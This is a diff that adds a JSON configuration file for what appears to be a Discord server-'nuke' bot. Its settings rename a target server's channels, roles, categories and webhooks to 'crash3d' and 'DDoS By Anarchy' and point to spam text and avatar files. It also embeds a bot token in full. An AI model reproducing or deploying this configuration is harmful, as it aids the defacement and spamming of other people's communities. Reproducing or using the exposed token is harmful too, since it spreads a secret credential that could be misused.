@@ -1,0 +1,21 @@
+{
+	"token": "MTA4NTYxNDY0NDk1MTAwMzE3Nw.G7doie.ivjVmrHST1472NinEMbX1LuuqG5X2DbpPche-E",
+	"prefix": "!",
+	
+	"command_cooldown_time": 300,
+
+	"developer_list": [],
+	"developer_success_icon_url": "",
+	"developer_error_icon_url": "",
+
+	"nuke_channels_name": "crash3d",
+	"nuke_voice_name": "DDoS By Anarchy",
+	"nuke_categories_name": "DDoS By Anarchy",
+
+	"nuke_server_name": "...<<<CaSh3D>>>...",
+	"nuke_roles_name": "crash3d",
+	"nuke_webhook_name": "CrAsH3D by Anarchy Syndicate",
+
+	"nuke_avatar_file": "avatar.jpg",
+	"spam_text_file": "spam_text.txt"
+}
